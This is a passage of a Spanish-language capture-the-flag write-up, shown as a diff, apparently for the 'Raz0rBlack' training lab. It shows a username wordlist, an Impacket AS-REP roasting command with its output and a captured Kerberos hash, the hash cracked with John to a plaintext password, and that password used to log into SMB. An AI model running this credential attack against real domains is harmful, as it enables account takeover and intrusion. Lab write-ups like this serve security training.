@@ -163,3 +163,92 @@ steven bradley			STEGO SPECIALIST
 chamber lin			CTF PLAYER(INACTIVE)
 
 Con esta información hago una wordlist y la uso para ver hacer un ataque AS-REP, para ver si consigo algun hash de contraseña de kerberos.
+cat /home/mksk/wordlists/adusers.txt 
+ljudmila
+rico
+tyson
+steven
+chamber
+daven
+imogen
+tamara
+arthur
+carl
+nolan
+reza
+daven
+imogen
+tamara
+arthur
+carl
+nolan
+reza
+ljudmila
+rico
+tyson
+steven
+chamber
+ljudmila.vetrova
+ljudmila_vetrova
+lvetrova
+vetrova
+tyson.williams
+twilliams
+steven.bradley
+sbradley
+rico.delgado
+rdelgado
+daven.royce
+droyce
+imogen.royce
+iroyce
+
+Consigo un hash.
+/opt/impacket$ python3 examples/GetNPUsers.py raz0rblack.thm/ -usersfile /home/mksk/wordlists/adusers.txt -dc-ip 10.128.144.87 -no-pass
+Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:1a00be9962362f2893b8cd5750f5ec25$5a1eeb52db4ef871329d2ecb18935e4695463f3377e1134d0214f1890ed3fbf33ae0700ddb8a9adc22f53d56fc6bd3b5975ad9cc6b063e0025006f5043ab4e8afccef035e83753891a78c5c6165884ed89eec807b7199f3b499c61acdedcbfb19fff896fabb3c6abfc1f3c88a4895ac5cf88400283507fa17d42612765e3e9f361679dc0d5b6b0b85b02aa651fab4ecff3206537aa1ed00d0b0a6cb667cc079fb35dccd220be8ee53ea6732de189c1585007776ea360a1b4ce6d156ea90725a0109cff1a0b55d2aae2f0bccde73004582835a24fee1c55b2bf6fd1205c9390db1a0691f421c25aaad8f2e42b71af061e
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+
+Lo paso a un archivo y lo crackeo con john: 
+
+cat /home/mksk/snap/john-the-ripper/694/.john/john.pot 
+$krb5asrep$23$1a00be9962362f2893b8cd5750f5ec25$5a1eeb52db4ef871329d2ecb18935e4695463f3377e1134d0214f1890ed3fbf33ae0700ddb8a9adc22f53d56fc6bd3b5975ad9cc6b063e0025006f5043ab4e8afccef035e83753891a78c5c6165884ed89eec807b7199f3b499c61acdedcbfb19fff896fabb3c6abfc1f3c88a4895ac5cf88400283507fa17d42612765e3e9f361679dc0d5b6b0b85b02aa651fab4ecff3206537aa1ed00d0b0a6cb667cc079fb35dccd220be8ee53ea6732de189c1585007776ea360a1b4ce6d156ea90725a0109cff1a0b55d2aae2f0bccde73004582835a24fee1c55b2bf6fd1205c9390db1a0691f421c25aaad8f2e42b71af061e:roastpotatoes
+
+En este punto tengo un set de credenciales twilliams:roastpotatoes. Pruebo en varios servicios, y consigo meterme en smb.
